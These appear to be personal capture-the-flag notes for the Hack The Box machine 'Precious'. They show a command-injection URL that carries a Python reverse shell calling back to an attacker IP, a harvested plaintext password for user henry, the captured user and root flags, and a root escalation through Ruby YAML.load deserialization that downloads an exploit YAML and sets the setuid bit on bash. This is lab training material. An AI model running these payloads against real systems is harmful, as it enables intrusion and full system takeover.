
```
10.10.11.189  precious.htb

python3 -m http.server

https://github.com/advisories/GHSA-rhwx-hjx2-x4qr

http://10.10.16.14:8000/?name=%20`which python3`

http://10.10.16.14:8000/?name=%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.14",3456));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`

cd /home/ruby/.config
cat config
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"


user.txt
c7551a27c7dc1aeb6808ab6101740832

 (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))

YAML Load is vulnerable

wget https://gist.githubusercontent.com/staaldraad/89dffe369e1454eedd3306edc8a7e565/raw/4b85e6fe8f5708f0a7ba87dbecb6954f8f380bee/ruby_yaml_load_sploit2.yaml


sudo /usr/bin/ruby /opt/update_dependencies.rb

 git_set: "chmod +s /bin/bash"


mv ruby_yaml_load_sploit2.yaml dependencies.yml


root.txt
181a80edfa450901daef148213f82239


https://www.hackthebox.com/achievement/machine/336799/513


https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/
```
